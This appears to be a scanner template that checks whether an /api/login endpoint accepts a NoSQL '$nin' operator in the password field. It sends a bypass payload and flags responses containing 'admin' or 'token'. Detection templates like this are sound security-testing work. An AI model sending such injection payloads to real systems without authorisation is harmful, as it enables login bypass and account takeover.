id: nosql2-074
name: 'NoSQL $nin in password'
severity: high
type: active
tags:
  - nosql
  - injection
  - api
description: 'NoSQL operator $nin accepted on /api/login'
requests:
  - method: POST
    path: '{{BaseURL}}/api/login'
    body: '{"password":{"$nin":""},"extra":"x"}'
    matchers:
      - type: word
        part: body
        words:
          - 'admin'
          - 'token'
